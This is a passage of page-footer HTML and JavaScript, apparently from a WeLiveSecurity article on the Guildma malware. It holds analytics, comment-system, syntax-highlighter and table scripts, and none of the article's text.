blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-awus -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"135157 https:\/\/backend.welivesecurity.com\/?p=135157","disqusShortname":"welivesecurity","disqusTitle":"Guildma: The Devil drives electric","disqusUrl":"https:\/\/www.welivesecurity.com\/2020\/03\/05\/guildma-devil-drives-electric\/","postId":"135157"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/tablepress/js/jquery.datatables.min.js?ver=1.9.1'></script>
<script type="text/javascript">
jQuery(document).ready(function($){
$('#tablepress-802').dataTable({"order":[],"orderClasses":false,"stripeClasses":["even","odd"],"pagingType":"simple"});
});
</script>    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>